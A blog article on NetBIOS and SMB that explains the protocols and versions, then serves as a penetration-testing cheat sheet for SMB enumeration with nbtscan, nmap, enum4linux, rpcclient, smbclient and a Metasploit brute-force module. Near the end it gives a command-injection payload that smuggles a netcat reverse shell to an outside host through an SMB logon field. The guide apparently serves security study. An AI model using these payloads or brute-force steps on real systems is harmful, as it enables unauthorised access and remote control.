---
layout: post
title: 'Protocol Dissection :- NetBIOS & SMB'
date: '2022-01-28'
description: 'This article examines the two protocols NetBIOS and SMB. SMB ran on top of the NetBIOS protocol in early versions of Windows, but eventually moved to its own dedicated TCP port. While NetBIOS is the older protocol, understanding both is nearly essential for understanding Windows network communications. The SMB protocol enables networked computers applications and services to communicate via Inter Process Communication (IPC) and to share files.'
coverimage: Protocol_DissectionNet_Bios__SMB.jpg
tags: netbios smb
published: true
posttype: article
categories: article
---
##What is NetBIOS?

NetBIOS is an acronym for Network Basic Input/Output System. It provides services related to the session layer of the OSI model, allowing applications on separate computers to communicate over a local area network. 
  
NetBIOS is an API and not a networking protocol.  

##How does NetBIOS operate?
  
Older operating systems ran NetBIOS using the NetBIOS Frames (NBF) and NetBIOS over IPX/SPX (NBX) protocols.  
  
In modern networks, NetBIOS normally runs over TCP/IP via the NetBIOS over TCP/IP (NBT) protocol. This results in each computer in the network having both an IP address and a NetBIOS name corresponding to a (possibly different) host name.  

##What are the benefits of NetBIOS?
  
NetBIOS provides three distinct services:  
  
* Name service (NetBIOS-NS) for name registration and resolution.  
* Datagram distribution service (NetBIOS-DGM) for connectionless communication.  
* Session service (NetBIOS-SSN) for connection-oriented communication.  

##What is SMB?
  
N.B. SMB, an upper layer, is a service that runs on top of the Session Service and the Datagram service, and is not to be confused as a necessary and integral part of NetBIOS itself. It can now run atop TCP with a small adaptation layer that adds a packet length to each SMB message; this is necessary because TCP only provides a byte-stream service with no notion of packet boundaries  

##How does SMB operate?
  
SMB can run on top of the Session (and lower) network layers in several ways:  
  
* Directly over TCP, port 445  
* Via the NetBIOS API on UDP ports 137, 138 &amp; TCP ports 137, 139 (NetBIOS over TCP/IP);  

##What are the benefits of SMB?

The SMB "Inter-Process Communication" (IPC) system provides named pipes and was one of the first inter-process mechanisms widely available to programmers, allowing services to inherit the authentication performed when a client first connected to an SMB server. 
  
Since Windows 2000, SMB has been running with a thin layer on top of TCP, similar to the Session Message packet of NBT's Session Service, using TCP port 445 rather than TCP port 139; this is known as "direct host SMB." 
  
## SMB Versions

### Version Summary:  

* SMB1 – Windows 2000, XP and Windows 2003.  
* SMB2 – Windows Vista SP1 and Windows 2008  
* SMB2.1 – Windows 7 and Windows 2008 R2  
* SMB3 – Windows 8 and Windows 2012.  

### SMB 2.0

Microsoft introduced a newer version of the protocol (SMB 2.0 or SMB2) with Windows Vista in 2006  

### SMB 2.1

With Windows 7 and Server 2008 R2, a new opportunistic locking mechanism was introduced, resulting in minor performance improvements. 
  
### SMB 3.0 (previously SMB 2.2)

Was introduced with Windows 8 and Windows Server 2012.  
  
### SMB 3.0.2 

Introduced with Windows 8.1 and Windows Server 2012 R2. In 3.0.2, the earlier SMB version 1 can be optionally disabled to increase security.
   
### SMB 3.1.1 

Debuted alongside Windows 10 and Windows Server 2016. This version adds AES 128 GCM encryption to the AES 128 CCM encryption introduced in SMB3, as well as a pre-authentication integrity check using the SHA-512 hash. SMB 3.1.1 also requires secure negotiation when connecting to clients that use SMB 2.x or higher. 

## Security Flaws Windows  

There have been numerous security flaws in Microsoft's implementation of the protocol or the components on which it directly relies over the years.
Other vendors' security flaws stem primarily from a lack of support for newer authentication protocols such as NTLMv2 and Kerberos in favour of NTLMv1, LanMan, or plaintext passwords. Real-time attack tracking reveals that SMB is a primary attack vector for intrusion attempts, such as the Sony Pictures attack in 2014.  
  
NetBIOS is effectively becoming a legacy protocol in client-server networks based on post-MS Windows 2000 / NT. NetBIOS was also designed for non-routable local area networks. NetBIOS effectively provides backwards compatibility for network devices that predate DNS compatibility in most post-2000 networks running Windows 2000 or later. NetBIOS's primary role in Client-Server networks (as well as those with networked peripheral hardware that predates DNS compatibility) is to provide name resolution to computers and networked peripherals. Furthermore, it enables the access and sharing of networked hardware, as well as the mapping and browsing of network folders, shares, and shared printers, faxes, and so on. Its primary function is to provide name resolution to a computer and shared folders via a session-layer protocol transported over TCP/IP. As a result, Windows 2000-based Client-Server networks - and later - do not require this insecure method of name resolution, addressing, or navigating network shares. 
  
## Security Flaws in Samba:  

Some versions of Samba 3.6.3 and lower have serious security flaws that can allow anonymous users to gain root access to a system via an anonymous connection by exploiting an error in Samba's remote procedure call.

Badlock, a critical security flaw in Windows and Samba, was publicly disclosed on April 12, 2016. CVE-2016-2118 mentions Badlock for Samba (SAMR and LSA person-in-the-middle attacks are possible). 
  
  
## Null Sessions
  
* In Windows 2000 and Windows NT, null sessions are enabled by default.
* They are also enabled by default in Windows XP and Windows 2003 Server, but they do not support user account enumeration. 
  
## SMB Programs 

smbcacls - Set or get ACLs on an NT file or directory names  
```  
/usr/bin/smbcacls  
```

smbclient - ftp-like client to access SMB/CIFS resources on servers    
```
/usr/bin/smbclient
```
  
smbcontrol - send messages to smbd, nmbd or winbindd processes  
```  
/usr/bin/smbcontrol  
```  

smbcquotas - Set or get QUOTAs of NTFS 5 shares  
```  
/usr/bin/smbcquotas  
```  

smbget - wget-like utility for download files over SMB  
```  
/usr/bin/smbget  
/usr/bin/smbmap  
```  

smbpasswd - The Samba encrypted password file  
smbpasswd - change a user's SMB password  
```
/usr/bin/smbpasswd  
```
  
smbspool - send a print file to an SMB printer  
```  
/usr/bin/smbspool  
```  

smbstatus - report on current Samba connections  
```  
/usr/bin/smbstatus  
```  

smbtar - smbtar - shell script for backing up SMB/CIFS shares directly to UNIX tape drives  
```  
/usr/bin/smbtar  
```  

smbtree - A text based smb network browser  
```  
/usr/bin/smbtree  
```  

Others: 
``` 
/usr/bin/dceoversmb   
/usr/bin/pth-smbclient  
/usr/bin/pth-smbget  
```

## Smbtree

Show smbtree version  
```
smbtree --version  
```

Show all workgroups  
```
smbtree  
```

## Nbtscan vs Nbtstat

The difference between nbtstat and nbtscan in Windows is that nbtscan can work with multiple IP addresses.

To determine the meaning of each service in the NetBIOS report, visit Microsoft Knowledge Based on NetBIOS Suffixes (16th Character of the NetBIOS Name) at: 

* https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-brws/0c773bdd-78e2-4d8b-8b3d-b7506849847b

### Nbtscan

nbtscan is an abbreviation for 'NetBIOS over TCP scanner. 

This is a command-line tool that searches for open NetBIOS nameservers on a local or remote TCP/IP network, which is the first step in discovering open shares. It is based on the functionality of the standard Windows tool nbtstat, but instead of just one address, it operates on a range of addresses. 

#### Scanning the network

This scan will return the IP address of the computer(s), the NetBIOS name, the current logged in user, and the mac address of all NetBIOS on the local subnet. 

```
nbtscan 10.11.1.1-254
nbtscan 110.11.1.0/24
```

#### Examining one host

Once we have decided on a host, we can enter just one host for more information. 
```
nbtscan -hv 10.11.1.5
```

The `-h` makes the output services human-readable and the `-v` gives a verbose output.

If instead you would like to see a dump of the packets you can use the `-d` option but it **can not** be used with the `-v` or `-d`.
```
nbtscan -d 10.11.1.5
```

Sometimes you may want to grep the results and so the -s flag can come in handy to put a separator between the fields.

Pipe as a separator:
```
nbtscan -vh -s "|" 10.11.1.0/24
```

Colon as a separator:
```
nbtscan -vh -s : 192.168.1.0/24
```

Finally, we may want to enter the IP addresses of hosts to scan, which we can do as follows. 
```
nbtscan -f iplist.txt
```

#### Additional Flags

As per the man page, the following three flags sometimes can be useful.

Bandwidth output throttling. Slow down output so that it uses no more that bandwidth bps. Useful on slow links, so that outgoing queries do not get dropped.
```
nbtscan -b 1000 10.11.1.5
```

Use local port 137 for scans. Win95 boxes respond to this only. You need to be root to use this option on Unix.
```
nbtscan -r 10.11.1.0/24
```

Suppress banners, headers and error messages.
```
nbtscan -q 10.11.1.0/24
```

## Nmblookup

Use this on a single IP address for greater detail following the nbtscan.

Do a node status on <name> as an IP address:
```
nmblookup -A <ip address>
```

To find the IP address of a computer given its computer name, we can use:
```
nmblookup <computer name>
```

To find the group the computer belongs to and its MAC address:
```
nmblookup -S <computer name>
```

For example, lines containing '<00>' in the output of 'nmblookup -S <computer name>' can be interpreted as follows. The one that is not followed by group is the computer name, and the one that is is the workgroup name to which this computer belongs. 

To find IP addresses of all computers in a workgroup, we can use:
```
nmblookup <workgroup name>
```

If we want computer names along with IP addresses, then we can use:
```
nmblookup -S <workgroup name>
```

### Workgroup Flags

* workgroup `<00>` group - This name is a remnant of the original LAN Manager browse service.
* workgroup `<1D>` unique - This name identifies the Local Master Browser (LMB, sometimes called simply "Master Browser") for a subnet.
* workgroup `<1E>` -  group A node that is capable of acting as a "Browser" registers this group name to listen for election announcements.
* nt_domain `<1B>` unique Name registered by the Domain Master Browser. Must be registered with the NBNS in order to be of any real use.
* nt_domain `<1C>` Internet group Registered by all Domain Controllers in the given NT Domain.

## Nmap

Nmap scripts for SMB are located at:
```
ls -l /usr/share/nmap/scripts/smb*
ls -lsa /usr/share/nmap/scripts | grep "smb"
ls /usr/share/nmap/scripts | grep "smb" | sed "s/.nse/,/" | tr -d "\n\r"
```

The below scripts are available to us.
```
smb-brute,smb-enum-domains,smb-enum-groups, smb-enum-processes,smb-enum-sessions,smb-enum-shares,smb-enum-users,
smb-flood,smb-ls,smb-mbenum, smb-os-discovery,smb-print-text,smb-psexec, smb-security-mode,smb-server-stats
smb-system-info,smbv2-enabled,smb-vuln-conficker,smb-vuln-cve2009-3103,smb-vuln-ms06-025,smb-vuln-ms07-029
smb-vuln-ms08-067, smb-vuln-ms10-054,smb-vuln-ms10-061,smb-vuln-regsvc-dos
```

We start off by seeing which SMB ports are open (the `--open` switch is used in order to show only open ports).
```
nmap -p 139,445 192.168.1.0/24 --open
```

We can also do basic SMB Vulnerability Checking.
```
nmap -p T:137,139,445,U:137,139,445 --script=vulns --script-args=unsafe=1 192.168.1.111
```

### Discover network shares with Nmap

After a list of shares is found, the script attempts to connect to each of them anonymously, which divides them into "anonymous", for shares that the NULL user can connect to, or "restricted", for shares that require a user account.

* https://nmap.org/nsedoc/scripts/smb-enum-shares.html

Use the smb-os-discovery.nse script to discover NetBIOS computer name. The reason for this is that a computer named maria-pc, most likely to have a user named maria, so you can use it during brute forcing phase.
```
nmap --open -sS -sV --script smb-enum-shares.nse,smb-os-discovery.nse -p445,139 10.11.1.1/24
```

## Enum4linux

Enum4linux is a wrapper for smbclient, rpcclient, net and nmblookup.

* http://labs.portcullis.co.uk/tools/enum4linux/

Verbose mode, shows the underlying commands being executed by enum4linux and is a great way to learn what the tool is running behind the scenes.
```
enum4linux -v <target-ip>
```

Do Everything, runs all options apart from dictionary based share name guessing. (-U -S -G -P -r -o -n -i). This opion is enabled if you don't provide any other options.
```
enum4linux -a <target-ip>
```

Lists usernames, if the server allows it - (RestrictAnonymous = 0).
```
enum4linux -U <target-ip>
```

If you have managed to obtain credentials, you can pull a full list of users regardless of the ‘RestrictAnonymous’ option.
```
enum4linux -u administrator -p password -U <target-ip>
```

Pulls usernames from the default RID range (500-550,1000-1050).
```
enum4linux -r <target-ip>
```

Pull usernames using a custom RID range.
```
enum4linux -R 600-660 <target-ip>
```

Lists groups. if the server allows it, you can also specify username -u and password -p.
```
enum4linux -G <target-ip>
```

List Windows shares, again you can also specify username -u and password -p
```
enum4linux -S <target-ip>
```

Perform a dictionary attack, if the server does not let you retrieve a share list
```
enum4linux -s shares.txt <target-ip>
```

Pulls OS information using smbclient, this can pull the service pack version on some versions of Windows
```
enum4linux -o <target-ip>
```

Pull information about printers known to the remove device.
```
enum4linux -i <target-ip>  
```

## Rpcclient

Connect to anonymous SMB
```
root@kali:~# rpcclient -U "" 10.20.50.80
```

Enumerate domain users
```
rpcclient $> enumdomusers
user:[nobody] rid:[0x1f5]
user:[user] rid:[0x3e8]
user:[root] rid:[0x3e9]
```

Convert names to SIDs
```
rpcclient $> lookupnames root
root S-1-5-21-2814459928-1332494333-2211073762-1001 (User: 1)
```

Convert SIDs to names
```
rpcclient $> lookupsids S-1-5-21-2814459928-1332494333-2211073762-1001
```

Query user info
```
rpcclient $> queryuser 1001
```

## Metasploit

Brute Force SMB Login
```bash
msfconsole
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.5
set SMBUser administrator
set PASS_FILE /root/Documents/passwords_list
set THREADS 10
run
```

### Metasploit Module

The pipe_auditor scanner will determine which named pipes are available over SMB. This can provide you with some insight into some of the services that are running on the remote system during your information gathering stage.

```
msf> use scanner/smb/pipe_auditor
```

## Smbclient

The -N switch indicates that we do not have a root password for this connection.
```
smbclient -L 192.168.75.14 -N
```

The above might show us the Samba or Windows server version that we can look in exploit DB.

This allows us to login to shares.
```
smbclient //host/share
```

Mount discovered share
```
smbclient //MOUNT/share -I target -N
```

List the contents of a share
```
smbclient -L \\RALPH -I 10.11.1.31 -N
smbclient -L \\MAILSLOT\Browser -I 10.11.1.218 -N  
```  
  
## Mounting SMB Shares (`mount`)

When mounting Windows shares, we need to use cifs as the filesystem type. To do this, our first step is to download the cifs-utilities.
```
apt-get install cifs-utils
```

After that, we can create a directory in which we want to mount our share. For example, we could install it in the /tmp/ or /mnt/ drives. 
```
mkdir /tmp/myshare
```

We can then mount this directly using the following two options. N.B. The difference is that mount.cifs is a wrapper for mount.
```
mount -t cifs //10.11.1.31/wwwroot /mnt/myshare
mount.cifs //10.11.1.31/wwwroot /mnt/myshare
```

Passing in options
```
mount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
```

To unmount a particular share, you have two options. You can either 

a) navigate to the share on your local system and run
```
umount -A
```

Or

b) you can run the same command with the path following from any directory
```
umount -A /tmp/
```

To get a shell back from an SMB share.
```
logon "/=`nc 10.11.0.233 443 -e /bin/bash`"
```

## smb4k

To install
```
apt-get install smb4k -y
```

To Run
```
smb4k
```

## Smbmap

List all shares
```
smbmap -H 10.11.1.2
```
Recursively view all files inside a share named share
```
smbmap -H 10.11.1.2 -r "share"
```
  
## Pass The Hash  
  
More To Come :-)